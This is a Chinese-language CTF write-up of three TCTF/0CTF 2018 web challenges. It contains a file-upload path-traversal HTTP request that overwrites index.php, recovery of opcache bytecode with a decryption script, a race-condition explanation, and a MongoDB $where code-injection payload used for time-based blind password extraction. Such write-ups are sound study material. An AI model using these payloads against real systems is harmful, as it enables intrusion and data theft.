---
title: TCTF/0CTF2018 部分Web Writeup
date: 2018-04-05 01:10:50
tags:
- opcache
- nodejs
- race
---

# ezdoor #

题目上来就是代码审计，先看看代码

```
<?php

error_reporting(0);

$dir = 'sandbox/' . sha1($_SERVER['REMOTE_ADDR']) . '/';
if(!file_exists($dir)){
  mkdir($dir);
}
if(!file_exists($dir . "index.php")){
  touch($dir . "index.php");
}

function clear($dir)
{
  if(!is_dir($dir)){
    unlink($dir);
    return;
  }
  foreach (scandir($dir) as $file) {
    if (in_array($file, [".", ".."])) {
      continue;
    }
    unlink($dir . $file);
  }
  rmdir($dir);
}

switch ($_GET["action"] ?? "") {
  case 'pwd':
    echo $dir;
    break;
  case 'phpinfo':
    echo file_get_contents("phpinfo.txt");
    break;
  case 'reset':
    clear($dir);
    break;
  case 'time':
    echo time();
    break;
  case 'upload':
    if (!isset($_GET["name"]) || !isset($_FILES['file'])) {
      break;
    }

    if ($_FILES['file']['size'] > 100000) {
      clear($dir);
      break;
    }

    $name = $dir . $_GET["name"];
    if (preg_match("/[^a-zA-Z0-9.\/]/", $name) ||
      stristr(pathinfo($name)["extension"], "h")) {
      break;
    }
    move_uploaded_file($_FILES['file']['tmp_name'], $name);
    $size = 0;
    foreach (scandir($dir) as $file) {
      if (in_array($file, [".", ".."])) {
        continue;
      }
      $size += filesize($dir . $file);
    }
    if ($size > 100000) {
      clear($dir);
    }
    break;
  case 'shell':
    ini_set("open_basedir", "/var/www/html/$dir:/var/www/html/flag");
    include $dir . "index.php";
    break;
  default:
    highlight_file(__FILE__);
    break;
}
```

很简单的代码，差不多就是，你可以上传任意文件，但没有权限访问上传的文件。

所以思路很清楚，需要想办法覆盖index.php

很简单，用`x/../index.php/.`就可以绕过

构造请求

```
POST /?action=upload&name=x/../index.php/. HTTP/1.1
Host: 202.120.7.217:9527
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:58.0) Gecko/20100101 Firefox/58.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Content-Type: multipart/form-data; boundary=---------------------------18588164571683579890682678358
Content-Length: 420
Cookie: PHPSESSID=mu9mc6r8n7ccenpb94rrd1ibk5
Connection: close
Upgrade-Insecure-Requests: 1

-----------------------------18588164571683579890682678358
Content-Disposition: form-data; name="file"; filename="test.php"
Content-Type: text/php

	

<?php echo 2333;?>

-----------------------------18588164571683579890682678358
Content-Disposition: form-data; name="submit"

Submit
-----------------------------18588164571683579890682678358--

```

接下来就是读一下`/var/www/html/flag/`里的文件，拿到文件`93f4c28c0cf0b07dfd7012dca2cb868cc0228cad`

从文件的结构来看是php的opcache文件

想到可以用很久以前提到过用来分析opcache webshell的工具

[当时写过的翻译文](https://lorexxar.cn/2016/05/27/opcache-jcfx/)

工具链接
[https://github.com/GoSecure/php7-opcache-override](https://github.com/GoSecure/php7-opcache-override)

工具很久了，直接pull下来是跑不起来的，需要在py2.7下安2.8.3左右的construct库，然后工具就能用了。

但是中间很长时间的都会报错，到很晚才发现，在opcache的文件结构上，最开始是由`OPCACHE\x00`作为开始的，但获取回来不知道为什么没有这个`\x00`，修改文件之后成功获取到了php源代码的字节码。

```
 function encrypt() {
  #0 RECV(!0, None);
  #1 RECV(!0, None);
  #2 !0 = INIT_FCALL(!0, 'mt_srand');
  #3 !0 = SEND_VAL(1337, !0);
  #4 DO_ICALL(!0, !0);
  #5 ASSIGN(None, '');
  #6 STRLEN(None, !0);
  #7 ASSIGN(None, None);
  #8 STRLEN(None, !0);
  #9 ASSIGN(None, None);
  #10 ASSIGN(None, 0);
  #11 JMP(->-24, None);
  #12 !0 = INIT_FCALL(!0, 'chr');
  #13 !0 = INIT_FCALL(!0, 'ord');
  #14 FETCH_DIM_R(None, None);
  #15 !0 = SEND_VAR(None, !0);
  #16 DO_ICALL(!0, !0);
  #17 !0 = INIT_FCALL(!0, 'ord');
  #18 MOD(None, None);
  #19 FETCH_DIM_R(None, None);
  #20 !0 = SEND_VAR(None, !0);
  #21 DO_ICALL(!0, !0);
  #22 BW_XOR(None, None);
  #23 !0 = INIT_FCALL(!0, 'mt_rand');
  #24 !0 = SEND_VAL(0, !0);
  #25 !0 = SEND_VAL(255, !0);
  #26 DO_ICALL(!0, !0);
  #27 BW_XOR(None, None);
  #28 !0 = SEND_VAL(None, !0);
  #29 DO_ICALL(!0, !0);
  #30 ASSIGN_CONCAT(None, None);
  #31 PRE_INC(None, !0);
  #32 IS_SMALLER(None, None);
  #33 JMPNZ(None, ->134217662);
  #34 !0 = INIT_FCALL(None, 'encode');
  #35 !0 = SEND_VAR(None, !0);
  #36 DO_UCALL(!0, !0);
  #37 !0 = RETURN(None, !0);

}
function encode() {
  #0 RECV(!0, None);
  #1 ASSIGN(None, '');
  #2 ASSIGN(None, 0);
  #3 JMP(->-81, None);
  #4 !0 = INIT_FCALL(None, 'dechex');
  #5 !0 = INIT_FCALL(None, 'ord');
  #6 FETCH_DIM_R(None, None);
  #7 SEND_VAR(None, !0);
  #8 DO_ICALL(!0, !0);
  #9 SEND_VAR(None, !0);
  #10 DO_ICALL(!0, !0);
  #11 ASSIGN(None, None);
  #12 STRLEN(None, !0);
  #13 IS_EQUAL(None, 1);
  #14 JMPZ(None, ->-94);
  #15 CONCAT('0', None);
  #16 ASSIGN_CONCAT(None, None);
  #17 JMP(->-96, None);
  #18 ASSIGN_CONCAT(None, None);
  #19 PRE_INC(None, !0);
  #20 STRLEN(None, !0);
  #21 IS_SMALLER(None, None);
  #22 JMPNZ(None, ->134217612);
  #23 !0 = RETURN(None, !0);

}

#0 ASSIGN(None, 'input_your_flag_here');
#1 !0 = INIT_FCALL(None, 'encrypt');
#2 SEND_VAL('this_is_a_very_secret_key', !0);
#3 SEND_VAR(None, !0);
#4 DO_UCALL(!0, !0);
#5 IS_IDENTICAL(None, '85b954fc8380a466276e4a48249ddd4a199fc34e5b061464e4295fc5020c88bfd8545519ab');
#6 JMPZ(None, ->-136);
#7 !0 = ECHO('Congratulation! You got it!', !0);
#8 !0 = EXIT(!0, !0);
#9 !0 = ECHO('Wrong Answer', !0);
#10 !0 = EXIT(!0, !0);

```

根据php的一些文档，逐步分析字节码，猜测源码，其中最麻烦的坑可能就是变量不确定吧，中间的很多循环都有问题

[http://php.net/manual/ro/internals2.opcodes.list.php](http://php.net/manual/ro/internals2.opcodes.list.php)


最终还原出来的代码近似于，其中`encode`函数猜测和python的`encode('hex')`相同
```

encrypt(pwn, data) {
    mt_srand(1337)
    $160 = strlen(pwn);
    $144 = strlen(data);
    $cipher = "";
    for ($176=0;$176<$160;$176++) {
        $cipher .= chr(ord(data[$176]) ^ ord(pwn[$176%144])^mt_rand(0,255))
    }
    return encode($cipher);
}

encrypt("flag", "this_is_a_very_secret_key") == "85b954fc8380a466276e4a48249ddd4a199fc34e5b061464e4295fc5020c88bfd8545519ab"

```

直接写python代码逆运算一下

```
secret = "this_is_a_very_secret_key"
result = "85b954fc8380a466276e4a48249ddd4a199fc34e5b061464e4295fc5020c88bfd8545519ab"
mt_rand = [151,189,92,232,167,217,167,90,114,82,84,72,9,134,182,90,23,152,129,27,93,6,22,114,194,105,104,203,65,60,215,147,238,81,111,91,179,57,195,148,8,72,61,71,122,91,137,196,223,225,76,134,196,244,114,245,174,247,20,18,26,195,105,162,170,196,251,8,78,230,131,88,93,136,47,71,132,227,18,189,9,241,92,77,50,76,176,45,179,184,242,161,173,0,49,73,84,255,45,226]

j=0
s = ""

for i in result.decode('hex'):
	s+=chr(ord(i)^mt_rand[j]^ord(secret[j%len(secret)]))
	j+=1

print s

```

这里有个很需要注意的点就是，这里的`mt_rand`需要php7.2.x以上生成的数据，不然随机数生成结果不同。


# easy ums #

这题真的是很坑很坑的题目，比赛时遇到一直猜测是和dns或者请求库有关的漏洞，结果没想到是一个比较简单的条件竞争。

附上一片别人的Writeup

[https://coxxs.me/676](https://coxxs.me/676)

题目条件特别少，大意就是，注册时的手机号填ip，验证码会通过想ip的80端口发送请求来发送验证码。

大致就是这样
```
202.120.7.196 - - [04/Apr/2018:23:48:46 +0800] "HEAD /?86beaba44806e4ed007aecef7ed1ab15 HTTP/1.1" 200 0 "-" "-" -
```

用这个验证码可以验证ip，你就可以把自己用户的ip修改为指定的，当你可以修改为8.8.8.8时，你就可以得到flag。

登陆成功后只有一个修改手机号的功能。

假设我们试图修改自己的验证ip时

![image.png-31.9kB][1]

我们可以发送这次post请求延时非常大，与我们平时代码书写习惯不同，这里应该是涉及到了对数据库的操作。

这时候假设我们用另一个浏览器登录的话，可以发现index.php页面没有收到任何改变，但如果我们在前一个浏览器的verify.php继续执行的话，仍然可以修改，那么我们可以猜测后台数据库的结构大致为

```
userid
new_ip
is_verify
```
在我们发起请求的时候，这里对数据库进行了插入新数据，而index.php页面则是获取了类似于`(userid, is_verify)`双限制的数据库结果。

如果后台是类似于这样的结构时，假设我们在发起修改为8.8.8.8的请求时，使用已经获取的旧的token码更新验证，就有可能将8.8.8.8更新为我们的ip。

需要注意的一点就是，这里对单独的seesion请求，请求是单线程处理的，也就是不存在竞争，这里必须用不同session竞争才能成功。

```
tctf{session_database_keep_updated}
```

# login me #

这个题在我看来其实是一个挺矛盾的题目，有意思的是它的利用点和方式很有趣，但又有很多无趣的点。

代码如下
```
var express = require('express')
var app = express()

var bodyParser = require('body-parser')
app.use(bodyParser.urlencoded({}));

var path    = require("path");
var moment = require('moment');
var MongoClient = require('mongodb').MongoClient;
var url = "mongodb://localhost:27017/";

MongoClient.connect(url, function(err, db) {
    if (err) throw err;
    dbo = db.db("test_db");
    var collection_name = "users";
    var password_column = "password_"+Math.random().toString(36).slice(2)
    var password = "XXXXXXXXXXXXXXXXXXXXXX";
    // flag is flag{password}
    var myobj = { "username": "admin", "last_access": moment().format('YYYY-MM-DD HH:mm:ss Z')};
    myobj[password_column] = password;
    dbo.collection(collection_name).remove({});
    dbo.collection(collection_name).update(
        { name: myobj.name },
        myobj,
        { upsert: true }
    );

    app.get('/', function (req, res) {
        res.sendFile(path.join(__dirname,'index.html'));
    })
    app.post('/check', function (req, res) {
        var check_function = 'if(this.username == #username# && #username# == "admin" && hex_md5(#password#) == this.'+password_column+'){\nreturn 1;\n}else{\nreturn 0;}';

        for(var k in req.body){
            var valid = ['#','(',')'].every((x)=>{return req.body[k].indexOf(x) == -1});
            if(!valid) res.send('Nope');
            check_function = check_function.replace(
                new RegExp('#'+k+'#','gm')
                ,JSON.stringify(req.body[k]))
        }
        var query = {"$where" : check_function};
        var newvalue = {$set : {last_access: moment().format('YYYY-MM-DD HH:mm:ss Z')}}
        dbo.collection(collection_name).updateOne(query,newvalue,function (e,r){
            if(e) throw e;
            res.send('ok');
            // ... implementing, plz dont release this.
        });
    })
    app.listen(8081)

});
```

很容易就能看出来核心代码，就是后面一部分

初看到这个题目其实很容易歪楼，很容易把问题想到mongdb注入上，实际上题目是一个代码注入。

因为req.body是我们发送的请求，那么我们就可以控制正则表达式来替换内容，通过合理的正则，我们可以替换为对`this.password`的操作，然后通过js代码执行来获取数据。

这是我们的最终payload
```
|#|=&|this.*"\)|=&|==|[]=%7C%7Ceval(&%7C%22%22+%5C%5B%22%7C=a&%7Ca%22%7C=%2B&%7C%22%2B%7C=&%7C%22%22%5C%5D%2b%7C=aaaa&%7Caaaa%22%7C=%2B&%7C%5C)%7B%7C%5B%5D=bbb).match(/^13fc892df79a86494792e14dcbef252a'+i+'.*/)){sleep(1000);}else{return%20&|\["|=&|""b|=%2b&|"bb|=&|return(\s.*)*0|=11111
```

通过修改这里的match来匹配密码，如果为真则sleep，通过这样的方式，我们成功把代码注入改成了一个盲注，后面就很简单了。



  [1]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/wfir4flmnno2knv9b5h21ibg/image.png
